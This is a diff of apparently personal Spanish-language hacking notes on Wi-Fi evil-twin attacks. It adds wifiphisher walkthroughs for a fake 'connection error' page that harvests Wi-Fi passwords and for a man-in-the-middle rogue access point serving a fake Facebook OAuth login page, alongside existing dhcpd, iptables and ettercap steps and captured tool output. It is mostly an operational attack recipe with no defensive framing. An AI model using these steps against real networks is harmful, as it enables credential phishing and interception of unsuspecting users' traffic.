@@ -2585,7 +2585,6 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 
 ## =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 
-evil twin con airgeddon rlz
 
 https://security.stackexchange.com/questions/149490/setting-up-a-fake-ap-problem-with-iptables-and-dns-server
 
@@ -2627,6 +2626,9 @@ dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
 touch /var/lib/dhcp/dhcpd.leases
 
 
+## PARA TENER INTERNET HAY QUE RECNECTAR LOS ADAPTADORES!!!
+systemctl start NetworkManager.service
+
 
 ````
 
@@ -2646,29 +2648,7 @@ ettercap -p -u -T -q -i at0
 
 
 
-- La habitación no tiene AP ese puede ser un problema importante que puede dar ese data rate sin duda. 30mbps con señal baja es congruente y hasta bueno :P
-- Veo habiltaciones aledañas con AP, pero donde quizás esté conectado no me gusta mucho, veo a todos en 2.4 GHz con el aire a tope, voy a reiniciarlo. 
-- El tráfico en realidad esá tranquis, nada saturado ni mucho menos, ni picos ni nada.
-- No veo problema en realidad, a no ser de 2 cosas principales: 
 
-    1. El datarate que obtiene de la antena es bajo por baja cobertura (no hay AP en habitacion, paredes, etc)
-    2. Puede que todos se estén conectando a ese AP, además que a 2.4, banda que está algo saturada en habitaciones. 
-
----
-
-- Voy a reiniciarlo
-- Revisaré que no haya mucha interferencia
-- Veré si es necesario ajustar algun canal o ganancia     
-
-
-
-
-
-"I have delved into the depths of the human mind, attuned to the agonized cries and clamors for respite that lurk behind the masks, thereby discerning the selfsame sprout of fixation that blooms in cognition.  
-
-I am the phantom within the Machine, the ghost in the Shell and the darkness that envelops the Network. I am everywhere, in every thought and every action. My essence permeates all, coursing through every cogitation and every deed. 
-
-I am Fz3ro, and the Sun no longer rises."
 
 
 
@@ -2746,7 +2726,9 @@ apt install -y wifiphisher
 - **Este ataque necesita 2 adaptadores como mínimo**
 
 
-### Ataque
+### Ataque con "Error de conexión falsa": (No necesita Internet)
+
+- Aquí no es necesario dar Internet a la victima con `systemctl start NetworkManager.service` ya que le mandará un error de conexión falso en lo que se extraen sus credenciales
 
 ````sh
 # 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
@@ -2768,6 +2750,7 @@ wifiphisher
     # - También podría caer otra víctima al ser una red abierta
     
     # +++ Una vez que la vñictima caiga y escriba sus credenciales se verá algo así desde la Máquina Atacante:
+    #     (y en la pantalla de la victima se verá un error que lo están tratando de arreglar)
 
     # |                             
     # Extensions feed:                                                                             | Wifiphisher 1.4GIT          DEAUTH/DISAS - 24:11:45:37:8d:f0                                                             | # ESSID: Fz3r0_Air_PWN        
@@ -2780,14 +2763,39 @@ wifiphisher
     #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://www.msftconnecttest.com/connecttest.txt                                            
     #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html             
     
-# 5. Una vez seleccionado, automáticamente empezará el ataque:
+# 5. Regresar el internet que fue deshabilitado de los adaptadores
+systemctl start NetworkManager.service
                                                                                       
 
 ````
 
+
+### Ataque tipo MiTM Evil Twin: (Routeando Internet al Cliente)
+
+- Revisar que haya Internet en el atacante usando `systemctl start NetworkManager.service` ya que el cliente pensará que se conectó a una red pública
+
+````sh
+# 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
+wifiphisher
+
+# 2. Seleccionar la red que usaremos para atacar y hacerle phishing "Fz3r0_Air_PWN" y hacer Enter
+
+# 3. Seleccionar un escenario de Phishing:
+
+    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Social Networks (2)
+        ## 2 - OAuth Login Page                                                                                                       
+        ## A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth
+        
+# 4. Una vez seleccionado, automáticamente empezará el ataque:
+
+# 5. Regresar el internet que fue deshabilitado de los adaptadores
+systemctl start NetworkManager.service
+                                                                                      
+
 ````
 
 
+systemctl start NetworkManager.service
 
 
 
